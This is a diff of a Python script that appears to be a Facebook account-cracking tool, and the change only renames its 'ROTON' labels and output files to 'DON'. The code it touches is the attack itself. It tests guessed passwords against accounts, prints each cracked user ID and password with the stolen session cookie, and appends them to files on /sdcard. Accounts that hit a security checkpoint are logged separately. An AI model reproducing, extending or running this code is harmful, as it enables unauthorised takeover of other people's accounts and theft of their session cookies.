@@ -302,17 +302,17 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[65:80]
-                print('\033[38;5;46m[ROTON-OK] ' +uid+'|'+ps+    '  \n\033[1;31m[\x1b[38;5;46mCOOKIE - 🍪\033[1;31m] \033[1;97m'+coki+ ' ')
+                print('\033[38;5;46m[DON-OK] ' +uid+'|'+ps+    '  \n\033[1;31m[\x1b[38;5;46mCOOKIE - 🍪\033[1;31m] \033[1;97m'+coki+ ' ')
                 cek_apk(session,coki)                
-                open('/sdcard/ROTON-COOKIE.txt','a').write(uid+'|'+ps+ '|' +coki+'\n')
-                open('/sdcard/ROTON-OK.txt', 'a').write( uid+'|'+ps+'\n')
+                open('/sdcard/DON-COOKIE.txt','a').write(uid+'|'+ps+ '|' +coki+'\n')
+                open('/sdcard/DON-OK.txt', 'a').write( uid+'|'+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m[ROTON-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
-                open('/sdcard/ROTON-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\033[38;5;46m[DON-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
+                open('/sdcard/DON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
@@ -323,7 +323,7 @@ def b(uid,pwx,tl):
     except:
         pass
 def superuser():
-    UMO="Roton-"
+    UMO="DON-"
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
